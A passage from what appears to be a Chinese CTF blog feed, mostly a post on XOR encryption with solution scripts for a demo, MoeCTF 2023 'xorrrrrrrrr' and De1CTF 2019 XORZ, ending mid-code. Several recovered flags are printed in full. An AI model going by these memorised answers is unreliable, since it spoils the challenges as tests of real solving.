class="string">b&#x27;\x05\\\x1e\xd4u*\xe0\xf3w\xc6\x0c\xc4r\xbbh^\\\xafL\x91\xa7f\xf2\xe6\x1cH=\x9e\x19\xfd)\xc2S\xcc7\xe6\x80#0N*\xfd\xa3S\x08\xa8ik?&#x27;</span></span><br><span class="line"><span class="string">211188662731758863427946381877198496775371670862648580138469143303016383244049847985679632443910715787648463257824063</span></span><br><span class="line"><span class="string">b&#x27;\x05\\\x1e\xd4u*\xe0\xf3w\xc6\x0c\xc4r\xbbh^\\\xafL\x91\xa7f\xf2\xe6\x1cH=\x9e\x19\xfd)\xc2S\xcc7\xe6\x80#0N*\xfd\xa3S\x08\xa8ik?&#x27;</span></span><br><span class="line"><span class="string">12842454256006200840327330825396197845927483635849122825220513270564143733836993752723210090679333406611887619653501</span></span><br><span class="line"><span class="string">b&#x27;Spirit&#123;final__lcg__is__co0m1ing__are_you_ready?&#125;&#x27;</span></span><br><span class="line"><span class="string">44355748885252857173734817195521565844604528001661238528768568403024066532459185976193576751791737758534692839133319</span></span><br><span class="line"><span class="string">b&#x27;\x01 /c\xbe \xe2\xbf\xb7\xee\xdc\x85(\x15\xab\xb4=0)?\x01\x8cwY&lt;\t\x10e\xb4\x80\x9b\x88\xe1\xb5.\xf9\xf8&#123;[?\x05\xbd\x1e\x08\xd0\x1a\xc0\x90\x87&#x27;</span></span><br><span class="line"><span class="string">44355748885252857173734817195521565844604528001661238528768568403024066532459185976193576751791737758534692839133319</span></span><br><span class="line"><span class="string">b&#x27;\x01 /c\xbe \xe2\xbf\xb7\xee\xdc\x85(\x15\xab\xb4=0)?\x01\x8cwY&lt;\t\x10e\xb4\x80\x9b\x88\xe1\xb5.\xf9\xf8&#123;[?\x05\xbd\x1e\x08\xd0\x1a\xc0\x90\x87&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>对于稍微难些的LCG后续再去学习   二元LCG 三元LCG等  最近没太多时间 先留个坑 ：）</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>XOR加密</title>
    <url>/posts/a2e01687/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>异或加密，是密码学中的一种简单加密算法，通常会在出现在Re或Crypto中，用于已知key对flag进行逐位异或，通常会与其他加密算法一起对flag进行加密。本篇将简要介绍异或加密在CTF密码学中的应用，对题目进行简要分析。</p>
<p>【笔者水平有限(密码学小白)，可能会有理解错误的地方，不吝赐教Orz】</p>
<h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>异或 是一个数学运算符，缩写XOR，应用于逻辑运算，在数学中符号记作“⊕”。如果两个值不相同，那么异或结果为1；如果两个值相同，则异或结果为0。异或运算有如下性质：</p>
<p>交换律：A⊕B=B⊕A</p>
<p>结合律：A⊕(B⊕C)=(A⊕B)⊕C</p>
<p>恒等律：A⊕0=A</p>
<p>自 逆：A⊕A=0</p>
<h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313</span><br><span class="line">KEY2 ^ KEY1 = 37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e</span><br><span class="line">KEY2 ^ KEY3 = c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1</span><br><span class="line">FLAG ^ KEY1 ^ KEY3 ^ KEY2 = 04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf</span><br></pre></td></tr></table></figure>

<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>KEY1 ^  (KEY2 ^ KEY1) </p>
<p>= KEY1 ^ KEY1 ^ KEY2【交换律】</p>
<p>= 0 ^ KEY2 【自逆】</p>
<p>= KEY2 【恒等律】</p>
<p>同理可得 KEY2 ^ (KEY2 ^ KEY3) = KEY3 </p>
<p>FLAG ^ KEY1 ^ KEY3 ^ KEY2 = TMP</p>
<p>两侧同时异或KEY1 KEY2 KEY3 可得到FLAG</p>
<h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">KEY1 = <span class="built_in">int</span>(<span class="string">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY1 = <span class="built_in">int</span>(<span class="string">&#x27;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY3 = <span class="built_in">int</span>(<span class="string">&#x27;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">KEY2 = KEY1 ^ KEY2_xor_KEY1</span><br><span class="line">KEY3 = KEY2 ^ KEY2_xor_KEY3</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">int</span>(<span class="string">&#x27;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&#x27;</span>, <span class="number">16</span>) ^ KEY1 ^ KEY2 ^ KEY3</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(FLAG)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(FLAG))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 159805433661873705497880084580614789222721324997857681199215485</span></span><br><span class="line"><span class="comment"># b&#x27;crypto&#123;x0r_i5_ass0c1at1v3&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="2023MoeCTF-xorrrrrrrrr"><a href="#2023MoeCTF-xorrrrrrrrr" class="headerlink" title="2023MoeCTF xorrrrrrrrr"></a>2023MoeCTF xorrrrrrrrr</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>DESCRIPTION: 芝士什么运算？</p>
<p>此题包含一个result.log 和一个task.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;moectf&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">article = <span class="built_in">open</span>(<span class="string">&#x27;article.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对两个字节序列进行异或操作的函数 </span></span><br><span class="line"><span class="comment"># zip(x,y)  异或运算x^y 得到的结果bytes()转换</span></span><br><span class="line">strxor = <span class="keyword">lambda</span> x,y: <span class="built_in">bytes</span>([a^b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(x,y)])</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    range_start = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(article) - <span class="built_in">len</span>(flag))  <span class="comment"># 任意位置开始</span></span><br><span class="line">    mask = article[range_start:range_start + <span class="built_in">len</span>(flag)]  <span class="comment"># 开始位置 flag长度位</span></span><br><span class="line">    result.append(strxor(flag,mask))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    fs.writelines([<span class="built_in">str</span>(i)+<span class="string">&quot;\n&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>res = flag ^ mask       mask 为 article中 随机取得一段内容</p>
<p>已知 flag的前段部分为moectf{  异或res，可以得到部分 mask 即部分文章内容碎片(7位的随机)【当时做的时候卡到这里了】</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag1 = <span class="string">b&quot;moectf&#123;&quot;</span></span><br><span class="line">data = <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span>+<span class="string">&quot;,&quot;</span>.join(<span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>).readlines())+<span class="string">&quot;]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    strxor = <span class="keyword">lambda</span> x, y: <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)])</span><br><span class="line">    tmps = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 已知前面部分明文</span></span><br><span class="line">        <span class="built_in">print</span>((tmp := strxor(flag1, x)))</span><br><span class="line">        tmps.append(tmp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在这些碎片中存在多处 大似相同的片段 然后取部分内容 匹配出相似的片段【看的wp 看了好久才懂了点 太菜了…Orz】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp2 = tmps[i][<span class="number">1</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="comment"># print(tmp2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp2 <span class="keyword">in</span> tmps[j]:</span><br><span class="line">            <span class="built_in">print</span>(i,j,tmps[i],tmps[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(tmps)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tmps))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 28 33 b&#x27;ms. Spe&#x27; b&#x27;ams. Sp&#x27;</span></span><br><span class="line"><span class="comment"># 相差较小中间也包含标点符号  最像同一个片段</span></span><br><span class="line">c1 = data[<span class="number">33</span>]</span><br><span class="line">c2 = data[<span class="number">28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;</span></span><br><span class="line">flag = [<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)] + <span class="number">71</span>*[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 再次进行异或</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">72</span>):</span><br><span class="line">    flag[x] = flag[x-<span class="number">1</span>] ^ c1[x] ^ c2[x-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>



<h4 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag1 = <span class="string">b&quot;moectf&#123;&quot;</span></span><br><span class="line">data = <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span>+<span class="string">&quot;,&quot;</span>.join(<span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>).readlines())+<span class="string">&quot;]&quot;</span>)</span><br><span class="line"><span class="comment"># 参考wp https://github.com/XDSEC/MoeCTF_2023/blob/main/Challenges/Crypto/xorrrrrrrrr/writeup.ipynb</span></span><br><span class="line"><span class="comment"># 可得到 元素为 bytes类型的数组</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    strxor = <span class="keyword">lambda</span> x, y: <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)])</span><br><span class="line">    <span class="comment"># print(len(x))</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="number">72</span></span><br><span class="line">    tmps = []</span><br><span class="line">    tmps2 = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 已知前面部分明文 moectf&#123;</span></span><br><span class="line">        tmp = strxor(flag1, x)</span><br><span class="line">        tmps.append(tmp)</span><br><span class="line">        <span class="comment"># You will learn how to  ... 拼不出来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp2 = tmps[i][<span class="number">1</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="comment"># print(tmp2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp2 <span class="keyword">in</span> tmps[j]:</span><br><span class="line">            <span class="built_in">print</span>(i,j,tmps[i],tmps[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(tmps)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tmps))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 28 33 b&#x27;ms. Spe&#x27; b&#x27;ams. Sp&#x27;</span></span><br><span class="line"><span class="comment"># 相差较小  中间包含同一标点 最像同一个片段</span></span><br><span class="line">c1 = data[<span class="number">33</span>]</span><br><span class="line">c2 = data[<span class="number">28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;</span></span><br><span class="line">flag = [<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)] + <span class="number">71</span>*[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">72</span>):</span><br><span class="line">    flag[x] = flag[x-<span class="number">1</span>] ^ c1[x] ^ c2[x-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2019-De1CTF-XORZ"><a href="#2019-De1CTF-XORZ" class="headerlink" title="2019 De1CTF XORZ"></a>2019 De1CTF XORZ</h3><h4 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h4><p>在做这个题目之前 先简单了解下什么是汉明距离。【看到这题一脸懵，看了WP后才懂了些】</p>
<p>汉明距离【Hamming distance】</p>
<p>在信息论中，两个等长字符串之间的汉明距离 是两个字符串对应位置的不同字符的个数。</p>
<p>简单来说 汉明距离度量了通过替换字符的方式将字符串x变成y所需要的最小的替换次数。比如</p>
<blockquote>
<p>1011101与1001001 之间的汉明距离是2。</p>
<p>2143896与2233796之间的汉明距离是3。</p>
<p>“toned”与”roses”之间的汉明距离是3。</p>
</blockquote>
<h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">&quot;de1ctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(ki)) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>参考文章 <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a></p>
<h5 id="1-去盐"><a href="#1-去盐" class="headerlink" title="1.去盐"></a>1.去盐</h5><p>key 38个十六进制数，30个未知字符</p>
<p>[2:].zfill(2)   si去掉前两位的0x </p>
<p>salt key都是通过cycle()循环利用，其中salt已知，所以先考虑异或将salt去掉</p>
<p>c = p ^ ki ^ si</p>
<p>c ^ si = p ^ ki</p>
<p>由于c、si均为已知的可求出来。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2 = cycle(salt)</span><br><span class="line">nosalt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp = c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int = <span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re = <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt = nosalt + temp_re</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="2-猜解密钥长度"><a href="#2-猜解密钥长度" class="headerlink" title="2.猜解密钥长度"></a>2.猜解密钥长度</h5><p>密钥key长度小于38 其中已知位数8位，所以未知位数长度小于30</p>
<p>这里就可以用到汉明距离来猜解密钥长度。快速求解汉明距离的方法 就是 将等长字符串 进行异或。两个二进制字符异或后计算值为1的 比特位格式 就是最后的汉明距离。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hamming(&quot;1010&quot;, &quot;1111&quot;) == 2</span><br><span class="line">hamming(&quot;1111&quot;, &quot;0000&quot;) == 4</span><br><span class="line">hamming(&quot;1111&quot;, &quot;1111&quot;) == 0</span><br></pre></td></tr></table></figure>

<p>大写字母A-Z ascii 65-90 65对应二进制 01000001 90对应二进制 01011010</p>
<p>小写字母a-z ascii 97-122</p>
<p>65对应二进制 01000001</p>
<p>90对应二进制 01011010 字母汉明距离平均为2-3</p>
<h6 id="汉明距离-密钥长度猜解之间的联系："><a href="#汉明距离-密钥长度猜解之间的联系：" class="headerlink" title="汉明距离 密钥长度猜解之间的联系："></a>汉明距离 密钥长度猜解之间的联系：</h6><p>两个以 Ascii编码的英文字符 之间的汉明距离是 23 所以正常英文字母的评价汉明距离为 23 【每比特】，任意字符（非纯字母）的两两汉明距离 平均为4。</p>
<p>正确分组的密文与密文直接的汉明距离 等于明文与明文之间的汉明距离【通过按正确密钥长度分组的密文与密文异或等于明文与明文异或证明】</p>
<p>所以 当使用正确的密钥长度后，两两字母进行计算汉明距离，这个值会趋于最小。</p>
<h5 id="3-密文解密"><a href="#3-密文解密" class="headerlink" title="3.密文解密"></a>3.密文解密</h5><p>1.异或加密中 使用相同密钥加密的明文和密文加存在这个规律： 密文和密文异或 等于 明文和明文异或。</p>
<p>2.空格和所有小写字母异或的结果是对应的大写字母； 空格和所有大写字母异或的结果是对应的小写字母。</p>
<p>除空格外，有些组合可出现异或结果是大小写字母，但是空格出现时，结果在大小写字母间的概率最大。</p>
<p>直接用文章的轮子Orz <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a>  第一步去掉salt后即可直接使用</p>
<h4 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">a, b</span>):     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">b1, b2</span>):</span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     for line in f:</span></span><br><span class="line"><span class="comment">#         text += line</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = base64.b64decode(text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">break_single_key_xor</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2=cycle(salt)</span><br><span class="line">nosalt=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp=c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int=<span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re= <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt=nosalt+temp_re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b=binascii.a2b_hex(nosalt)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#我们取其中前6段计算平局汉明距离</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span 